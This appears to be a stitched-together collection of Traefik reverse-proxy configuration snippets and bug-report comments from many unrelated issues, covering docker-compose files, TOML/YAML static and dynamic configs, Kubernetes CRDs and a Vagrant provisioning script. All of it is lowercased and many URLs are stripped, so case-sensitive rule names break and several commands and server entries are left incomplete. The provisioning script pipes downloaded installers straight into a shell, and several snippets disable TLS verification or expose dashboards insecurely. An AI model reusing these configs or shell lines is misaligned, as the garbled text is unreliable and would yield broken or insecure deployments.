http: routers: autsi: rule: "host(`api.localhost.local`) && ( pathprefix(`/auth`) || pathprefix(`/authz`) )" entrypoints: - web-secure service: autsi@docker tls: domains: - main: "api.localhost.local" foobar: rule: " host(`api.localhost.local`) && (pathprefix(`/api/foobar`)) " entrypoints: - web-secure service: portal-backend@docker portal-backend-https: rule: " host(`api.localhost.local`) && (pathprefix(`/api`)) " entrypoints: - web-secure middlewares: - auth-request service: portal-backend@docker tls: domains: - main: "api.localhost.local" middlewares: auth-request: forwardauth: address: " " tls: insecureskipverify: true
``` traefik/conf/tls.yml
tls: certificates: - certfile: /certs/localhost+5.pem keyfile: /certs/localhost+5-key.pem stores: - default stores: default: {} options: default: minversion: versiontls12 snistrict: true preferserverciphersuites: true
``` traefik/conf/dashboard.yml
http: routers: api-dashboard: rule: "host(`traefik.localhost`) && (pathprefix(`/api`) || pathprefix(`/dashboard`))" middlewares: - auth service: api@internal middlewares: auth: basicauth: users: # => user:user - "user:$2y$10$itlennzhimviu9morh/gq.p7upnwzluuib3m899lpfkbb9mfxslq2"
``` docker-compose.yml
version: '3'
services: reverse-proxy: image: traefik:v2.2 ports: # the http port - "80:80" # the https port - "443:443" volumes: - /var/run/docker.sock:/var/run/docker.sock - "./traefik:/etc/traefik" - "./certs:/certs" portal-backend: image: brndnmtthws/nginx-echo-headers expose: - 8080 networks: default: labels: - traefik.enable=true - traefik.http.services.portal-backend.loadbalancer.server.port=8080 autsi: image: brndnmtthws/nginx-echo-headers expose: - 8080 networks: default: labels: - traefik.enable=true - traefik.http.services.autsi.loadbalancer.server.port=8080 networks: default: external: name: traefik_bugs
as this is running in production, i do not feel happy to share the complete config ;) i'll setup an example config soon, wanted to get this out there ;) **`traefik.yml`**
global: sendanonymoususage: false api: dashboard: true entrypoints: http: address: ":80" https: address: ":443" providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false file: filename: /foo/traefik-conf.yml watch: true certificatesresolvers: certs-le: acme: email: foo@bar storage: acme.json # enable for staging server # caserver: httpchallenge: entrypoint: http accesslog: filepath: "./access.log" bufferingsize: 100
``` **`traefik-conf.yml`**
http: middlewares: secure-redirect: redirectscheme: scheme: https permanent: true traefik-auth: basicauth: users: - "user:password"
``` **docker-compose.yml**
version: '3'
services: traefik: image: traefik:latest restart: unless-stopped container_name: traefik command: --docker --accesslog --loglevel="info" security_opt: - no-new-privileges:true ports: - 80:80 - 443:443 networks: - proxy volumes: - /var/run/docker.sock:/var/run/docker.sock - ./traefik.yml:/etc/traefik/traefik.yml - ./traefik-conf.yml:/foo/traefik-conf.yml - ./acme.json:/acme.json - ./access.log:/access.log labels: - "traefik.enable=true" # http config - "traefik.http.routers.traefik.entrypoints=http" - "traefik.http.routers.traefik.rule=host(`traefik.example.org`)" - "traefik.http.routers.traefik.middlewares=secure-redirect@file" # https config - "traefik.http.routers.traefik-secure.entrypoints=https" - "traefik.http.routers.traefik-secure.rule=host(`traefik.example.org`)" - "traefik.http.routers.traefik-secure.tls=true" - "traefik.http.routers.traefik-secure.middlewares=traefik-auth@file" - "traefik.http.routers.traefik-secure.tls.certresolver=certs-le" - "traefik.http.routers.traefik-secure.service=api@internal" ...
``` as the only difference between both servers is that one is based on amd, i suspected that this might be the cause
however, i have no idea about what is going on
not needed
[global] checknewversion = false sendanonymoususage = false [log] format = "json" level = "info" [accesslog] format = "json" [accesslog.fields] defaultmode = "keep" [accesslog.fields.names] startutc = "drop" [accesslog.fields.headers] [accesslog.fields.headers.names] authorization = "drop" [metrics] [metrics.prometheus] buckets = [0.1, 0.3, 1.2, 5.0] entrypoint = "health" [entrypoints] [entrypoints.web] address = ":80" [entrypoints.web.http.redirections.entrypoint] to = "websecure" scheme = "https" permanent = true [entrypoints.websecure] address = ":443" [entrypoints.websecure.http.tls] [entrypoints.health] address = ":8080" [entrypoints.api] address = ":8443" [entrypoints.api.http.tls] [providers] [providers.docker] constraints = "label(`traefik_tag`, `mynet`)" endpoint = "tcp://my-swarm-endpoint:443" exposedbydefault = false network = "mynet" swarmmode = true watch = true [providers.docker.tls] ca = "/run/secrets/bundle_ca_crt" cert = "/run/secrets/bundle_user_crt" key = "/run/secrets/bundle_user_key" [providers.file] filename = "/etc/traefik/traefik-dynamic.toml" # labels on the service in the compose file complete this configuration
[api] dashboard = true [ping] entrypoint = "health"
``` this appears to be the same or similar as #4741 ### workaround: ``` labels: traefik.enable: 'true'
``` per #issuecomment-480593067 i\'m guessing that another workaround is using `name=value` label syntax: ``` labels: - "traefik.enable=true"
version: "3.7"
services: traefik: image: "traefik:2.1"
# image: "traefik:2.2" labels: - traefik.http.middlewares.cors.headers.accesscontrolallowmethods=get,post,put,delete,options
# config for 2.2:
# - traefik.http.middlewares.cors.headers.accesscontrolalloworiginlist= - traefik.http.middlewares.cors.headers.accesscontrolalloworigin=origin-list-or-null - traefik.http.middlewares.cors.headers.accesscontrolmaxage=240 - traefik.http.middlewares.cors.headers.accesscontrolallowheaders=set-cookie,content-type,authorization,x-test-auth - traefik.http.middlewares.cors.headers.accesscontrolallowcredentials=true - traefik.http.middlewares.cors.headers.addvaryheader=true - traefik.http.middlewares.buff.buffering.maxrequestbodybytes=5242880 - traefik.http.middlewares.buff.buffering.memrequestbodybytes=2097152 - traefik.http.middlewares.buff.buffering.maxresponsebodybytes=5242880 - traefik.http.middlewares.buff.buffering.memresponsebodybytes=2097152 - traefik.http.middlewares.buff.buffering.retryexpression=isnetworkerror() && attempts() < 2 - traefik.http.middlewares.auth.forwardauth.address= - traefik.http.middlewares.auth.forwardauth.authresponseheaders=x-auth-data - traefik.http.routers.traefik.rule=host(`traefik.local`) - traefik.http.services.traefik.loadbalancer.server.port=8080 command: - --providers.docker=true volumes: - /var/run/docker.sock:/var/run/docker.sock ports: - "127.0.0.1:80:80" networks: - service backend-auth: build: context: ./backend/auth/ dockerfile: dockerfile.local labels: - traefik.http.routers.backend-auth-open.rule=host(`api.local`) && pathprefix(`/auth/api/v1/login`) - traefik.http.routers.backend-auth-open.middlewares=cors@docker,buff@docker - traefik.http.routers.backend-auth-open.service=backend-auth-open - traefik.http.services.backend-auth-open.loadbalancer.server.port=8080 - traefik.http.routers.backend-auth.rule=host(`api.local`) && pathprefix(`/auth`) - traefik.http.routers.backend-auth.middlewares=cors@docker,buff@docker,auth@docker - traefik.http.routers.backend-auth.service=backend-auth - traefik.http.services.backend-auth.loadbalancer.server.port=8080 networks: - service backend-app: privileged: true build: context: ./backend/app/ dockerfile: dockerfile.local labels: - traefik.http.routers.backend-app.rule=host(`api.local`) && pathprefix(`/app`) - traefik.http.routers.backend-app.middlewares=cors@docker,buff@docker,auth@docker - traefik.http.routers.backend-app.service=backend-app - traefik.http.services.backend-app.loadbalancer.server.port=8080 networks: - service
azure aks, kubernetes ingress
```
using the docker-compose file from the basic-example in the quickstart guides, with minor modifications in line with the steps to reproduce above (uncommenting the log level argument, and later, adding a health check for the whoami service): ```
version: "3.3" services: traefik: image: "traefik:v2.2" container_name: "traefik" command: - "--log.level=debug" - "--api.insecure=true" - "--providers.docker=true" - "--providers.docker.exposedbydefault=false" - "--entrypoints.web.address=:80" ports: - "80:80" - "8080:8080" volumes: - "/var/run/docker.sock:/var/run/docker.sock:ro" whoami: image: "containous/whoami" container_name: "simple-service" labels: - "traefik.enable=true" - "traefik.http.routers.whoami.rule=host(`whoami.localhost`)" - "traefik.http.routers.whoami.entrypoints=web"
``` environment:
* macos 10.15.3
* docker desktop 2.3.0.3 (45519) * docker version 19.03.8, build afacb8b * docker-compose version 1.25.5, build 8a1c60f6
i've setup pebble, let's encrypts acme server meant for testing purposes, and start pebble first and await it to be ready, then start traefik
this is done in separate vms multiple times over as part of ci tests, and this is where i observe different outcomes between fully decoupled runs
# dynamic configuration
# dynamic.yaml: | http: middlewares: hsts: headers: stsincludesubdomains: false stspreload: false stsseconds: 15724800 redirect: redirectscheme: permanent: true scheme: https scheme: headers: customrequestheaders: x-scheme: https routers: default: entrypoints: - https middlewares: - hsts - scheme rule: pathprefix(`/`) service: default tls: certresolver: default domains: - main: local.jovyan.org options: default insecure: entrypoints: - http middlewares: - redirect rule: pathprefix(`/`) service: default services: default: loadbalancer: servers: - url: tls: options: default: ciphersuites: - tls_ecdhe_ecdsa_with_aes_256_gcm_sha384 - tls_ecdhe_rsa_with_aes_256_gcm_sha384 - tls_ecdhe_ecdsa_with_aes_128_gcm_sha256 - tls_ecdhe_rsa_with_aes_128_gcm_sha256 - tls_ecdhe_ecdsa_with_chacha20_poly1305 - tls_ecdhe_rsa_with_chacha20_poly1305 minversion: versiontls12 snistrict: true # static configuration
# traefik.yaml: | accesslog: fields: headers: names: authorization: redacted cookie: redacted set-cookie: redacted x-xsrftoken: redacted filters: statuscodes: - 500-599 certificatesresolvers: default: acme: caserver: email: jovyan@jupyter.test httpchallenge: entrypoint: http storage: /etc/acme/acme.json entrypoints: http: address: :80 https: address: :443 transport: respondingtimeouts: idletimeout: 10m0s log: level: debug providers: file: filename: /etc/traefik/dynamic.yaml
[metrics] [metrics.prometheus]
[ping] entrypoint = "ping"
[api] dashboard = true [entrypoints] [entrypoints.ping] address = ":8081" [entrypoints.ping.transport] [entrypoints.ping.transport.lifecycle] requestacceptgracetimeout = "60s" gracetimeout = "2h"
```
this is the middleware definition that worked in 2.0:
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: securityheaders namespace: traefik spec: headers: stspreload: "true" stsincludesubdomains: "true" stsseconds: 31536000 forcestsheader: "true" framedeny: "true" sslredirect: "true" ```
note: i am running traefik in a k3s cluster, using fluxcd to apply resources
- traefik in a docker container
- authelia in a docker container
- ubuntu 18.04 docker host
[accesslog] format = "json" [accesslog.filters] ..
[accesslog.fields.headers] defaultmode = "drop" [accesslog.fields.headers.names] "user-agent" = "keep" "content-type" = "keep" "cf-connecting-ip" = "keep" "x-forwarded-for" = "keep"
[global] checknewversion = false sendanonymoususage = false
[accesslog]
[log] level = "info"
[api] dashboard = true insecure = true
[entrypoints.blocks] address = ":10080"
[entrypoints.traefik] address = ":10088"
[providers] providersthrottleduration = "1s"
[providers.redis] endpoints = ["pseven-dev-redis-svc:16379"] rootkey = "blockrouter"
# no toml # - thats my helm command `helm upgrade --install kubernetes-dashboard stable/kubernetes-dashboard -n kube-system --set enableinsecurelogin=true`
# - check vagrant sample below for details
``` * [k3s]( as single host kubernetes without default traefik1
* [helm3]( installed
* host system: debian10 <details>
vagrant sample
</summary> <pre>
# -*- mode: ruby -*-
vagrant.configure("2") do |config| #config.vm.box = "ubuntu/bionic64" config.vm.box = "debian/buster64" config.vm.box_version = "10.3.0" config.vm.network "private_network", ip: "172.28.129.23" #config.vm.network "private_network", type: "dhcp" #config.vm.network "public_network", bridge: "en0: wlan (airport)" config.vm.synced_folder ".", "/usr/share/whoami-charts" config.vm.provider "virtualbox" do |vb| vb.memory = "1024" vb.cpus = 1 end config.vm.provision "shell", inline: <<shell # to prevent `k3s check-config` # /usr/sbin iptables v1.8.2 (nf_tables): should be older than v1.8.0 or in legacy mode (fail) update-alternatives --set iptables /usr/sbin/iptables-legacy apt-get update # install curl - if not exist # - if ! curl --version > /dev/null ; then apt --yes install curl else echo ">> command \'curl\' already installed." fi # install k3s - if not exist (without default traefik v1) # - # - without default traefik - if ! k3s -v > /dev/null ; then curl -sfl | install_k3s_exec="server --no-deploy traefik" sh - else echo ">> command \'k3s\' already installed." fi # install helm - if not exist if ! helm version > /dev/null ; then curl | bash export kubeconfig=/etc/rancher/k3s/k3s.yaml echo "export kubeconfig=/etc/rancher/k3s/k3s.yaml" >> /home/vagrant/.bashrc echo "export kubeconfig=/etc/rancher/k3s/k3s.yaml" >> /root/.bashrc else echo ">> command \'helm\' already installed." fi # ensure that traefik(v2) is deployed # - # - (traefik-doc: +1) helm repo add traefik helm repo update helm upgrade --install traefik traefik/traefik --namespace kube-system --set additionalarguments={--log.level=debug} # bind traefik /dashboard and /api on entrypoint:web cat << \'eof\' >> /tmp/traefik-dashboard.yaml # traefik-dashboard.yaml apiversion: traefik.containo.us/v1alpha1 kind: ingressroute metadata: name: traefik-dashboard spec: entrypoints: - web routes: - match: pathprefix(`/dashboard`) || pathprefix(`/api`) kind: rule services: - name: api@internal kind: traefikservice
eof kubectl delete ingressroute -n kube-system traefik-dashboard kubectl apply -f /tmp/traefik-dashboard.yaml helm repo add stable helm repo update helm upgrade --install kubernetes-dashboard stable/kubernetes-dashboard -n kube-system --set enableinsecurelogin=true cat << 'eof' >> /tmp/kubernetes-dashboard-ingressroute.yaml apiversion: traefik.containo.us/v1alpha1 kind: ingressroute metadata: name: kubernetes-dashboard spec: entrypoints: - web routes: - match: pathprefix(`/ui`) kind: rule middlewares: - name: strip-ui services: - name: kubernetes-dashboard port: 443
eof kubectl apply -f /tmp/kubernetes-dashboard-ingressroute.yaml -n kube-system cat << \'eof\' >> /tmp/kubernetes-dashboard-middleware.yaml apiversion: traefik.containo.us/v1alpha1 kind: middleware metadata: name: strip-ui spec: stripprefix: prefixes: - "/ui" - "/ui/"
eof kubectl apply -f /tmp/kubernetes-dashboard-middleware.yaml -n kube-system
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.proxyprotocol] trustedips = ["***"] [entrypoints.http.redirect] regex = "^ " replacement = " " permanent = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.proxyprotocol] trustedips = ["***"] [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [entrypoints.traefik] address = ":8080" [entrypoints.traefik.auth] [entrypoints.traefik.auth.basic] users = ["***"]
entrypoint = "http"
[kubernetes]
ingressclass = "traefik"
[traefiklog] format = "json"
keytype = "rsa4096"
email = "***"
storage = "/acme/acme.json"
entrypoint = "https"
onhostrule = true
acmelogging = true [acme.dnschallenge] provider = "pdns" resolvers = ["1.1.1.1:53","8.8.8.8:53"]
[api] entrypoint = "traefik" dashboard = true
docker service create --name whoami \\
--network traefikee_ingress \\
-l traefik.enable=true \\
-l traefik.http.middlewares.who-compress.compress=true \\
-l "traefik.http.middlewares.who-compress.compress.excludedcontenttypes=text/plain" \\
-l traefik.http.routers.who.entrypoints=web \\
-l "traefik.http.routers.who.rule=pathprefix(\\`/whoami\\`)" \\
-l traefik.http.services.who.loadbalancer.server.port=80 \\
-l "traefik.http.routers.who.middlewares=who-strip,who-compress" \\
-l "traefik.http.middlewares.who-strip.stripprefix.prefixes=/whoami" \\
containous/whoami
entrypoints: dns-udp: address: ":53/udp"
udp: services: dns-udp: loadbalancer: servers: - address: "backendip:53" routers: dns-udp: entrypoints: - "dns-udp" service: "dns-udp"
[global] checknewversion = false sendanonymoususage = false
[entrypoints] [entrypoints.web] address = ":80" [entrypoints.websecure] address = ":443" [entrypoints.udp5001] address = ":5001/udp" [entrypoints.tcp5001] address = ":5001/tcp"
[log] level = "debug"
[api] insecure = true dashboard = true
[providers.docker] endpoint = "unix:///var/run/docker.sock"
``` ```docker-compose.yml
version: \'3\' services: reverse-proxy: # the official v2 traefik docker image image: traefik:v2.2.1 # enables the web ui and tells traefik to listen to docker command: --api.insecure=true --providers.docker ports: # the http port - "80:80" # the web ui (enabled by --api.insecure=true) - "8080:8080" # iperf udp - "5001:5001/udp" # iperf tcp - "5001:5001/tcp" volumes: # so that traefik can listen to the docker events - "/var/run/docker.sock:/var/run/docker.sock" - "./traefik.toml:/etc/traefik/traefik.toml" iperf2server: image: mlabbe/iperf:2.0.10-r1 command: "-v -s -u -p 5002" ports: - "5002/tcp" - "5002/udp" labels: - "traefik.udp.routers.router-udp5001.entrypoints=udp5001" - "traefik.udp.services.iperfserver.loadbalancer.server.port=5002" - "traefik.tcp.routers.router-tcp5001.entrypoints=tcp5001" - "traefik.tcp.routers.router-tcp5001.rule=hostsni(`*`)" - "traefik.tcp.services.iperfserver-tcp.loadbalancer.server.port=5002" iperf3server: image: networkstatic/iperf3 command: "-v -s -p 5002" ports: - "5002/tcp" - "5002/udp" labels: - "traefik.udp.routers.router-udp5001.entrypoints=udp5001" - "traefik.udp.services.iperfserver.loadbalancer.server.port=5002" - "traefik.tcp.routers.router-tcp5001.entrypoints=tcp5001" - "traefik.tcp.routers.router-tcp5001.rule=hostsni(`*`)" - "traefik.tcp.services.iperfserver-tcp.loadbalancer.server.port=5002" iperf2client: image: mlabbe/iperf:2.0.10-r1 command: "-v -c reverse-proxy -u -b 10m -l 1450 -p 5001" labels: - "traefik.enable=false" iperf3client: image: networkstatic/iperf3 command: "-v -c reverse-proxy -u -b 128k -l 1450 -p 5001" labels: - "traefik.enable=false"
see
``` - "traefik.enable=true" - "traefik.http.routers.faf-content.rule=host(`content.${domainname}`) - "traefik.http.routers.faf-content.entrypoints=web-secure" - "traefik.http.routers.faf-content.tls.certresolver=default" - "traefik.http.routers.faf-content.middlewares=chainthing" - "traefik.http.middlewares.chainthing.chain.middlewares=allow-cors,redirect-replay-subdomain,redirect-replay-php" - "traefik.http.middlewares.redirect-replay-subdomain.redirectregex.regex=^(http|https)://replay.${domainname}/(.*)" - "traefik.http.middlewares.redirect-replay-subdomain.redirectregex.replacement=$${1}://api.${domainname}/game/$${2}/replay" - "traefik.http.middlewares.redirect-replay-php.redirectregex.regex=^(http|https)://content.${domainname}/faf/vault/replay_vault/replay.php\\\\?id=(.*)" - "traefik.http.middlewares.redirect-replay-php.redirectregex.replacement=$${1}://api.${domainname}/game/$${2}/replay" - "traefik.http.middlewares.allow-cors.headers.accesscontrolallowmethods=get,options,put" - "traefik.http.middlewares.allow-cors.headers.accesscontrolalloworigin=*" - "traefik.http.middlewares.allow-cors.headers.accesscontrolmaxage=100" - "traefik.http.middlewares.allow-cors.headers.addvaryheader=true" ```
installed using helm chart `traefik/traefix` with helm3 from " " into a kubernetes cluster
```toml ```
kubernetes crd
apiversion: traefik.containo.us/v1alpha1
kind: ingressroutetcp
metadata: name: mqtt namespace: default
spec: entrypoints: - mqtt routes: - match: hostsni(`*`) services: - name: mosquitto port: 8883
apiversion: traefik.containo.us/v1alpha1
kind: ingressrouteudp
metadata: name: radius1-udp namespace: default
spec: entrypoints: - radius1 routes: - services: - name: myapp-udp port: 1812
apiversion: traefik.containo.us/v1alpha1
kind: ingressrouteudp
metadata: name: radius2-udp namespace: default
spec: entrypoints: - radius2 routes: - services: - name: myapp-udp port: 1813
``` ingressroutes are quite long, let me know if i need to post them too.
kubernetes crd ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: redirect-to-https namespace: traefik
spec: redirectscheme: scheme: https permanent: true port: 443
```toml ``` 3-nodes swarm cluster; consul as provider.
# docker provider
labels: - "traefik.http.middlewares.nc-custom-headers.headers.customresponseheaders.strict-transport-security=max-age=15552000"
```
traefik.yaml
accesslog: {} api: insecure: true dashboard: true log: level: info format: json providers: docker: endpoint: unix:///var/run/docker.sock exposedbydefault: false file: directory: /etc/traefik/providers
``` /etc/traefik/providers/file.provider.yaml
http: middlewares: for-dev: chain: middlewares: - compress-it - cors-headers - security-headers - cache-headers compress-it: compress: {} security-headers: headers: framedeny: true contenttypenosniff: true referrerpolicy: no-referrer browserxssfilter: true stsseconds: 15552000 forcestsheader: true cors-headers: headers: accesscontrolallowcredentials: true accesscontrolallowheaders: - origin - authorization - content-type accesscontrolallowmethods: - option - get - post - put - patch accesscontrolalloworiginlist: - accesscontrolmaxage: 100 addvaryheader: true cache-headers: headers: customresponseheaders: cache-control: "no-cache, max-age=0"
``` docker-compose.yaml
backend: ..
labels: - "traefik.enable=true" - "traefik.http.routers.backend.rule=pathprefix(`/api`)" - "traefik.http.routers.backend.middlewares=for-dev@file"
``` **also with this above configuration, i am also not getting cors headers in the response as you can see in the response headers above.** it is related to this issue #6676
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.http.tls] certresolver = "myresolver" [[entrypoints.https.http.tls.domains]] main = "abc.123.site" sans = ["traefix.abc.123.site"] [certificatesresolvers.myresolver.acme] email = "qbowater@gmail.com" storage = "acme.json" [certificatesresolvers.myresolver.acme.tlschallenge] [certificatesresolvers.myresolver.acme.httpchallenge] entrypoint = "http" [providers] [providers.file] directory = "/home/qbowater/traefik" watch = true [api]
dashboard = true
``` ```yaml
http: routers: to-ssh2: rule: "host(`abc.123.site`) && pathprefix(`/xff40m9m5ucs6wti`)" service: ssh2 to-ssv2ray: rule: "host(`abc.123.site`) && pathprefix(`/kopxpkbc7f1q3me6`)" service: ssv2ray services: ssh2: loadbalancer: servers: - url: h2c://127.0.0.1:8080/xff40m9m5ucs6wti ssv2ray: loadbalancer: servers: - url:
``` ```yaml
http: routers: api: entrypoints: ["https"] rule: host(`traefix.abc.123.site`) service: api@internal middlewares: - auth middlewares: auth: basicauth: users: - "charlie:$2y$10$ysablp6pj1odmctvvitb7.ejmsevtqvvkutftdathcev6f8jn9ibq"
docker labels
- "traefik.enable=true"
- "traefik.http.routers.whoami.rule=host(`localhost`)"
- "traefik.http.routers.whoami.entrypoints=web"
- "traefik.http.middlewares.test-ratelimit.ratelimit.average=2"
- "traefik.http.middlewares.test-ratelimit.ratelimit.burst=5"
- "traefik.http.middlewares.test-ratelimit.ratelimit.period=1m"
- "traefik.http.routers.whoami.middlewares=test-ratelimit@docker"
- "traefik.http.middlewares.test-ratelimit.ratelimit.sourcecriterion.requestheadername=username"
```
```toml ```
traefik in docker with yaml file and docker provider
kubernetes deployment
### hints i found that, the mentioned message comes from #l324
if a pod goes to a notready state, it generates an event for traefik
it starts processing it, but if recovery is too fast (i.e
the new event comes in while still processing the first one) the code pointed finds that existing and new configuration are equal, thus skipping
later, processing the first event finishes, resulting in the service brought and remaining in down state from traefik's perspective
perhaps even during the --providersthrottleduration interval such a recovery event will be dropped
on my environment, reloading the configuraion (the function at #l34) sometimes takes a few seconds, so it is very easy to reproduce the issue
i have a pod with 1 sec readinessprobe, and just need to flap its' readiness down and up, thus traefik receives two events, with the latter being dropped.
my docker-compose.yml looks like this when it works
note that i disable ssl for the backend service and then use scheme http and port 80 on the service loadbalancer
```yml bc: image: mcr.microsoft.com/businesscentral/onprem:1810-ltsc2019 container_name: bc hostname: traeftest environment: - accept_eula=y - clickonce=y - webserverinstance=bc - publicdnsname=traeftest.westeurope.cloudapp.azure.com - user=vm-administrator - password=..
- auth=windows
# - usessl=y labels: - traefik.enable=true - traefik.http.routers.bc.rule=host(`traeftest.westeurope.cloudapp.azure.com`) && pathprefix(`/bc`) - traefik.http.routers.bc.entrypoints=websecure - traefik.http.routers.bc.tls.certresolver=myresolver - traefik.http.routers.bc.service=bc@docker - traefik.http.services.bc.loadbalancer.server.scheme=http - traefik.http.services.bc.loadbalancer.server.port=80
``` if docker-compose.yml looks like this then it doesn't work
note that i enable ssl for the backend service and then use scheme https and port 443 on the service loadbalancer
```yml bc: image: mcr.microsoft.com/businesscentral/onprem:1810-ltsc2019 container_name: bc hostname: traeftest environment: - accept_eula=y - clickonce=y - webserverinstance=bc - publicdnsname=traeftest.westeurope.cloudapp.azure.com - user=vm-administrator - password=..
- auth=windows - usessl=y labels: - traefik.enable=true - traefik.http.routers.bc.rule=host(`traeftest.westeurope.cloudapp.azure.com`) && pathprefix(`/bc`) - traefik.http.routers.bc.entrypoints=websecure - traefik.http.routers.bc.tls.certresolver=myresolver - traefik.http.routers.bc.service=bc@docker - traefik.http.services.bc.loadbalancer.server.scheme=https - traefik.http.services.bc.loadbalancer.server.port=443
``` the traefik config itself looks like this, unchanged in both cases
i've set insecureskipverify to true as the backend service uses self-signed certificates:
```yml traefik: image: traefik:2.2-windowsservercore-1809 container_name: traefik command: - --log.level=debug - --api.insecure=true
# - --certificatesresolvers.myresolver.acme.caserver= - --providers.docker=true - --providers.docker.exposedbydefault=false - --providers.docker.endpoint=npipe:////./pipe/docker_engine - --entrypoints.websecure.address=:443 - --entrypoints.sql.address=:1433 - --entrypoints.rtc.address=:7046 - --certificatesresolvers.myresolver.acme.tlschallenge=true - --certificatesresolvers.myresolver.acme.email=tobias.fenster@cosmoconsult.com - --certificatesresolvers.myresolver.acme.storage=c:/le/acme.json - --serverstransport.insecureskipverify=true ports: - "8080:8080" - "443:443" - "1433:1433" - "7046:7046" volumes: - c:\\users\\tfenster8982\\traefik:c:/le - type: npipe source: \\\\.\\pipe\\docker_engine target: \\\\.\\pipe\\docker_engine
traefik docker image version 2.2.0 and i viewed the dashboard on chrome 80.0.3987.149 on windows on a 1080p monitor
my suggestions would be to change that [line]( #l39) to 13px
[entrypoints] [entrypoints.http] address = ":80"
```
loglevel = "info"
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.forwardedheaders] trustedips = ["192.168.0.0/16", "172.16.0.0/12", "10.0.0.0/8"]
[traefiklog] format = "json"
[accesslog]
filepath = "/var/log/traefik/access.json" format = "json"
[accesslog.fields] defaultmode = "keep"
[accesslog.fields.names]
[accesslog.fields.headers] defaultmode = "keep"
[accesslog.fields.headers.names]
running on kubernetes 1.17.2
version: "3.4"
services: traefik: image: traefik:v1.7.22 environment: - "godebug=tls13=1" ports: - target: 80 published: 80 protocol: tcp mode: host - target: 8080 published: 8080 protocol: tcp mode: host - target: 443 published: 443 protocol: tcp mode: host volumes: - type: bind source: "/srv/traefik/keys" target: "/certs" read_only: true - type: bind source: "/srv/traefik/log" target: "/var/log/traefik" deploy: mode: global networks: - traefik-net - dockersocket4traefik_net command: | --docker --docker.swarmmode --docker.domain=traefik --docker.endpoint="tcp://dockersocketproxy:2375" --docker.watch --api --entrypoints="name:https address::443 tls:/certs/cert.crt,/certs/key.key tls.ciphersuites:tls_ecdhe_ecdsa_with_chacha20_poly1305,tls_ecdhe_rsa_with_chacha20_poly1305,tls_ecdhe_ecdsa_with_aes_256_gcm_sha384,tls_ecdhe_rsa_with_aes_256_gcm_sha384,tls_ecdhe_ecdsa_with_aes_128_gcm_sha256,tls_ecdhe_rsa_with_aes_128_gcm_sha256,tls_ecdhe_ecdsa_with_aes_128_cbc_sha256,tls_ecdhe_rsa_with_aes_128_cbc_sha256,tls_ecdhe_ecdsa_with_aes_256_cbc_sha,tls_ecdhe_ecdsa_with_aes_128_cbc_sha,tls_ecdhe_rsa_with_aes_256_cbc_sha,tls_ecdhe_rsa_with_aes_128_cbc_sha" --entrypoints="name:traefik address::8080 tls:/certs/cert.crt,/certs/key.key tls.ciphersuites:tls_ecdhe_ecdsa_with_chacha20_poly1305,tls_ecdhe_rsa_with_chacha20_poly1305,tls_ecdhe_ecdsa_with_aes_256_gcm_sha384,tls_ecdhe_rsa_with_aes_256_gcm_sha384,tls_ecdhe_ecdsa_with_aes_128_gcm_sha256,tls_ecdhe_rsa_with_aes_128_gcm_sha256,tls_ecdhe_ecdsa_with_aes_128_cbc_sha256,tls_ecdhe_rsa_with_aes_128_cbc_sha256,tls_ecdhe_ecdsa_with_aes_256_cbc_sha,tls_ecdhe_ecdsa_with_aes_128_cbc_sha,tls_ecdhe_rsa_with_aes_256_cbc_sha,tls_ecdhe_rsa_with_aes_128_cbc_sha" --entrypoints="name:http address::80 redirect.entrypoint:https" --insecureskipverify=true --loglevel="info" --traefiklog.filepath="/var/log/traefik/traefik.log" --accesslog.filepath="/var/log/traefik/access.log" ```
# set by chart template
linux amd64, running on ubuntu 18.04 w/ docker 19.03.8 ```yaml
accesslog: filepath: /log/access.log
api: dashboard: true debug: false
entrypoints: http: address: :80 https: address: :443 traefik: address: :81
log: format: json level: info
metrics: prometheus: entrypoint: traefik
providers: docker: exposedbydefault: false file: directory: /etc/traefik/rules watch: true
serverstransport: insecureskipverify: true
```
`ingress` mode installed via the helm chart
simply removing the `-` from the `namespace` aspect of the middleware works
ie: `traefik.ingress.kubernetes.io/router.middlewares: prefix@kuberntescrd` also, it may be good to give some explanation about the autogenerated names of the middlewares created via `crd`
for example explain something like: ```
middlewares created via crd take the format of `<k8s namespace>-<k8s name>@kubernetescrd`.
static configuration through environment for endpoints and kubernets ingress and kubernetes crd setup
kubernetes configuration for dynamic configuration for routes
kubernetes ingress and kubernetescrd, configured outside of the cluster.
`traefik.yaml`:
entrypoints: http: address: '0.0.0.0:8080' metrics: address: '0.0.0.0:9000'
metrics: prometheus: entrypoint: metrics
log: level: debug
accesslog: {}
providers: file: watch: true filename: "/etc/traefik/example-lb.yml" debugloggeneratedtemplate: true
``` `example-lb.yml`:
http: routers: example: entrypoints: - http middlewares: - example-headers - error-ratio-cb service: example rule: "pathprefix(`/`)" middlewares: example-headers: headers: customrequestheaders: host: "example.com" error-ratio-cb: circuitbreaker: expression: \'responsecoderatio(500, 600, 0, 600) > 0.10\' services: example: loadbalancer: passhostheader: true servers: - url: " "
no additional configuration was performed.
[entrypoints.https] compress = true
``` as long as the client/browser is talking directly to traefik, all is fine
however, when using a cdn in between, some cdns (such as cloudfront) cache gzip'd and non-gzip'd content separately, but only if vary: accept-encoding is present
if not present, then the cdn will cache the first request and serve it up to additional clients
if not-gzip'd, this likely just wastes bandwidth
if that first request was gzip'd and a later client is unable to handle a gzip'd response (perhaps a weird api clients, not browser), it will still be sent the gzip'd payload anyway.
traefik.yml : ```yml
entrypoints: http: address: :80 http: redirections: entrypoint: to: https scheme: https https: address: :443 http: tls: certresolver: myresolver middlewares: - secheader@file providers: docker: exposedbydefault: false file: directory: /etc/traefik/custom/ watch: true certificatesresolvers: myresolver: acme: email: "xxxx" storage: "/letsencrypt/acme.json" httpchallenge: entrypoint: http ``` custom/middlewares.yml : ```yml
http: middlewares: secheader: headers: framedeny: true contenttypenosniff: true browserxssfilter: true ```
docker-compose.yml : ```yml
version: '3.7'
